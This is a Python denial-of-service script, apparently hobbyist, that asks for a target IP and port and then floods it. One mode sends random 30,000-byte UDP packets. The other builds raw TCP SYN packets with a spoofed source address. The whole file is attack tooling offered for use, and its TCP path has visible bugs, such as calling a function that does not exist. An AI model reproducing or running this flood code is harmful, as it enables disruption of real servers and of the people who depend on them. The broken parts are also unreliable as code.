#!/usr/bin/python3

#DDOS SCRITP V1 BY Craglitch

#   ------------------------------------------------
# |   ____          __  __     _ _ _       _        |
# |  / ___|_ __ __ _\ \/ /__ _| (_) |_ ___| |__     |
# | | |   | '__/ _` |\  // _` | | | __/ __| '_ \    |
# | | |___| | | (_| |/  \ (_| | | | || (__| | | |   |
# |  \____|_|  \__,_/_/\_\__, |_|_|\__\___|_| |_|   |
# |                      |___/                      |
#   ------------------------------------------------
#   Code By CraXglitch python3 (NO COPYRIGHT)
#   PLEASE DONT STEAL code or i will kill YOU >:(
#   DDOS Scritp V1






import sys, random, socket, threading, os, time
from struct import *
from termcolor import colored
banner = """
\033[1;32m
 ____  ____   ___  ____
|  _ \|  _ \ / _ \/ ___|                   
| | | | | | | | | \___ \                   
| |_| | |_| | |_| |___) |   (DDOS) scritp v1
|____/|____/ \___/|____/    Code By Craglitch

\033[1;33m 
 What is (DDOS) Attack
 A distributed denial-of-service (DDoS) attack 
 is a malicious attempt to disrupt the normal 
 traffic of a targeted server, service or network 
 by overwhelming the target or its surrounding infrastructure 
 with a flood of Internet traffic.
\033[1;31m

FOR TERMUX USER USE UDP TYPE FLOOD IF U ROOTED YOU CAN USE BOTH 
TCP AND UDP BECAUSE TERMUX NEED ROOT TO CREATE RAW SOCKET AND
IF YOU ARE NOT ROOT U CANT DO ANYTHING.

I DONT KNOW IF TCP ERROR OR NOT IF ERROR ISSUE AT GITHUB AND CODE
LINE :V IF YOU CAN HELP ME FIX.


"""

os.system("clear")
print(banner)
ip = str(input(colored("IP : ", 'green')))
port = int(input(colored("PORT : ", 'green')))
choice = str(input(colored("(TCP / UDP) : ", 'yellow')))
times = int(input(colored("PACKETS : ", 'blue')))

#udp flood code function, variable, loop, dll...


def udp_flood():
   s_udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
   target = (str(ip),int(port))
   bytes = random._urandom(30000)
   count_output_udp = 1
   timeout = time.time() + times


   while 1:


     try:

         if time.time() > timeout:
            break


         else:
            pass


         s_udp.sendto(bytes, target)
         count_output_udp = count_output_udp + 1
         print("\033[1;32mSENDING \033[1;33m%s \033[1;32mUDP PACKETS TO SERVER :\033[34m %s\033[1;32m PORT :\033[1;34m %s "%(count_output_udp, ip, port,))


     except socket.error:
         print("\033[1;36m NO CONNECTION SENDING UDP PACKET FAILED SERVER MAYBE DOWN !!!! ")


     except:
         print("something error")
         sys.exit()

#tcp function and variable and dll wtffffff hahahahha im tired



def checksum(msg):
    s = 0
    for i in range(0, len(msg), 2):
        w = (ord(msg[i]) << 8) + (ord(msg[i+1]) )
        s = s + w

    s = (s>>16) + (s & 0xffff);
    s = ~s & 0xffff

    return s





def client():
    try :
      s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
      s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    except socket.error:
      print("\033[1;31mfailed create raw socket : permission denied")



source_ip = (str("127.0.0.1"))
dest_ip = socket.gethostbyname(str(ip))




def tcp_header_field():
  ihl = 5
  version = 4
  tos = 0
  tot_len = 20 + 20
  id = random.randint(1,65535)
  frag_off = 0
  ttl = random.randint(1,255)
  protocol = socket.IPPROTO_TCP
  check = 10 
  saddr =socket.inet_aton ( source_ip )
  daddr = socket.inet_aton ( dest_ip )
  ihl_version = (version << 4) + ihl
  global ip_header
  ip_header = pack('!BBHHHBBH4s4s', ihl_version, tos, tot_len, id, frag_off, ttl, protocol, check, saddr, daddr)




def tcp_syn():

  ip_header_field()
  source = random.randint(36000, 65535)
  dest = (int(port))
  seq = 0
  ack_seq = 0
  doff = 5
  fin = 0
  syn = 1
  rst = 0
  psh = 0
  ack = 0
  urg = 0
  window = socket.htons (5840)
  check = 0
  urg_ptr = 0
  offset_res = (doff << 4) + 0
  tcp_flags = fin + (syn << 1) + (rst << 2) + (psh <<3) +(ack << 4) + (urg << 5)
  tcp_header = pack('!HHLLBBHHH', source, dest, seq, ack_seq, offset_res, tcp_flags,  window, check, urg_ptr)
  source_address = socket.inet_aton( source_ip )
  dest_address = socket.inet_aton(dest_ip)
  placeholder = 0
  protocol = socket.IPPROTO_TCP
  tcp_length = len(tcp_header)
  psh = pack('!4s4sBBH', source_address , dest_address , placeholder , protocol , tcp_length);
  psh = psh + tcp_header;
  tcp_checksum = checksum(psh)
  tcp_header = pack('!HHLLBBHHH', source, dest, seq, ack_seq, offset_res, tcp_flags,  window, tcp_checksum , urg_ptr)
  global packet
  packet = ip_header + tcp_header



def tcp_flood():
    timeout = time.time() + times
    try:
          while True:
             if time.time() > timeout:
                break
             else:
               pass
             client()
             tcp_syn()
             s.sendto(packet, (dest_ip , 0))
             counter = 1
             counter = counter + 1
             print ("\033[1;32mSENDING \033[1;33m%s \033[1;32mTCP PACKETS TO SERVER :\033[34m %s\033[1;32m PORT :\033[1;34m %s "%(counter, ip, port))
    except socket.error:
        print("\033[1;36m NO CONNECTION SENDING TCP PACKET FAILED SERVER MAYBE DOWN !!!! ")
    except:
        print("something wrong")
        sys.exit()





def choice_def():
  if choice == "UDP":
    udp_flood()
  elif choice == "TCP":
    tcp_flood()
  else:
    print("\033[1;36mPLEASE ENTER TYPE DDOS CORRECRTLT UDP OR TCP !!!")

#finally im done this code or maybe error ;-; ok lets do a log:
# error _ 1
def main():
  choice_def()

if __name__ == "__main__":
    main()







